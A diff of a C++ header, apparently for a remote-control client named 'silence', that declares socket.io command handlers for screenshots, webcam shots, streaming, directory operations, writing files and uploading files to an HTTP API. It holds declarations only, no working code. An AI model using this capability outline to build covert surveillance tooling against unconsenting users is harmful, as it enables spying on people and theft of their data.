@@ -50,14 +50,16 @@ namespace silence
                        sio::message::list &ack_resp);
 
     private:
-        void greetEvent();                                // starts the client
-        void screenshotEvent();                           // takes a screenshot
-        void webcamShotEvent();                           // takes a webcam shot
-        void killStreamEvent();                           // kills a stream
-        void startStreamEvent();                          // creates a strean
-        void listDirEvent(const CommandObject &object);   // lists a directory
-        void mkDirEvent(const CommandObject &object);     // creates a directory
-        void removeDirEvent(const CommandObject &object); // removes a directory
+        void greetEvent();                                   // starts the client
+        void screenshotEvent();                              // takes a screenshot
+        void webcamShotEvent();                              // takes a webcam shot
+        void killStreamEvent();                              // kills a stream
+        void startStreamEvent();                             // creates a strean
+        void listDirEvent(const CommandObject &object);      // lists a directory
+        void mkDirEvent(const CommandObject &object);        // creates a directory
+        void removeEvent(const CommandObject &object);       // removes a directory
+        void writeFileEvent(const CommandObject &object);    // writes object["content"] to file
+        void downloadFileEvent(const CommandObject &object); // uploads object["path"] to http api
 
         void error(const std::string &event, const std::string &msg);
         void info(const std::string &info);
